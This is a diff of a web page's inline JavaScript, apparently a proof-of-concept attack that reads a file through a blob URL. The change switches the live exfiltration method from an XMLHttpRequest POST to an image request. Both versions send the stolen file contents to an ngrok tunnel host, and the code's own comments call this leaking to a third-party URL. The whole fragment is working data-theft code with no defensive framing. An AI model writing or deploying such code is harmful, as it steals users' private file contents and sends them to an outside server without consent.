@@ -18,32 +18,32 @@
   <script type="text/javascript">
 
 
-    // function blobCallback(blobUrl) {
-
-    //   theftFile(blobUrl, function (contents) {
-    //     // Leak file contents to a third-party URL
-    //     new Image().src = "https://4c15-122-180-180-86.ngrok.io/?data=" + encodeURIComponent(contents);
-    //   });
-
-    // }
-
     function blobCallback(blobUrl) {
 
       theftFile(blobUrl, function (contents) {
         // Leak file contents to a third-party URL
-        let xhr = new XMLHttpRequest();
-        xhr.open("POST", "https://4c15-122-180-180-86.ngrok.io/");
-
-        xhr.setRequestHeader("Accept", "application/*");
-        xhr.setRequestHeader("Content-Type", "application/*");
-
-        xhr.onload = () => console.log(xhr.responseText);
-
-        let data = contents;
-
-        xhr.send(data);
+        new Image().src = "https://4c15-122-180-180-86.ngrok.io/?data=" + encodeURIComponent(contents);
       });
+
     }
+
+//     function blobCallback(blobUrl) {
+
+//       theftFile(blobUrl, function (contents) {
+//         // Leak file contents to a third-party URL
+//         let xhr = new XMLHttpRequest();
+//         xhr.open("POST", "https://4c15-122-180-180-86.ngrok.io/");
+
+//         xhr.setRequestHeader("Accept", "application/*");
+//         xhr.setRequestHeader("Content-Type", "application/*");
+
+//         xhr.onload = () => console.log(xhr.responseText);
+
+//         let data = contents;
+
+//         xhr.send(data);
+//       });
+//     }
 
 
     function theftFile(url, callback) {
